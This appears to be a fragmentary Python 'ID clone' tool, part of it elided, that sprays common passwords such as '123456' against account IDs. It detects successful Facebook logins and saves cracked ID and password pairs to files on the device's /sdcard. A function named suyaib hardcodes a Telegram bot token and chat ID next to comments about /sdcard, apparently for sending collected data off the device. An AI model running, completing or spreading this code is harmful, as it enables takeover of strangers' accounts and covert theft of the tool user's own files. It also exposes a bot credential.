...
def main():
    ...
    print("—"*20)
    print("[1] FREE FIRE ID Clone")
    print("[2] PUBG ID Clone")
    print("—"*20)
    ask=input("Run and Enjoy !>")
    print("—"*20)
    if ask in["1"]:
        star="10000"
...
def login(uid):
    ...
    try:
        sys.stdout.write(f"\r \x1b[38;5;196m[\033[38;5;46mF\x1b[1;97m-\033[38;5;46mS\x1b[38;5;196m] \033[38;5;46m[{loop}-{len(oks)}]")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            ...
            if "session_key" in rp:
                print(f"\r\r [F-S] {uid} • {pw}")
                open("/sdcard/F-S-Run and Enjoy.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r [F-S] {uid} • {pw}")
                open("/sdcard/F-S-𝐃𝐀𝐓𝐀 𝐖𝐈𝐅𝐈 𝐖𝐎𝐑𝐊.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
...
def suyaib():
    ...
    bot_token = '6702580383:AAHpCTwHPRh7S48BnddtVw5ek2mhg1WJiNE' 
    chat_id = '5689384405'    
    #-------------( /sdcard\ )--------------#  
    #--------------------apk-------------------#																																							
    try:
